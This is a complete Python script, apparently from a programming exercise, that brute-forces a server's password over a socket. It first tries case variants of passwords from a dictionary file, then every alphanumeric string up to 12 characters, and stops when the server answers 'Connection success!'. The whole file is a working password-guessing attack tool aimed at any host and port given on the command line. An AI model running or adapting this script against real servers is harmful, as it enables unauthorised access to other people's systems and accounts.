import socket
import sys
from itertools import product
from string import digits, ascii_letters


def hack_single_pass_server(socket_, passwords):
    for password in passwords:
        socket_.send(password.encode())
        if socket_.recv(1024).decode() == "Connection success!":
            return password


def password_gen(pass_max_len, chars):
    for i in range(1, pass_max_len + 1):
        for p in product(chars, repeat=i):
            yield "".join(p)


def read_lines_from_file(path):
    with open(path) as file:
        return file.read().split("\n")


def dict_based_gen(dictionary):
    for line in dictionary:
        for password in product(*[c + c.upper() for c in line]):  # example:  "hack" -> "hH", "aA", "cC", "kK"
            yield "".join(password)


def run():
    with socket.socket() as st:
        st.connect((sys.argv[1], int(sys.argv[2])))
        # try typical passwords first
        result = hack_single_pass_server(st, dict_based_gen(read_lines_from_file("dictionaries/typical_passwords.txt")))
        if result:
            print(result)
        else:
            print(hack_single_pass_server(st, password_gen(12, digits + ascii_letters)))


run()
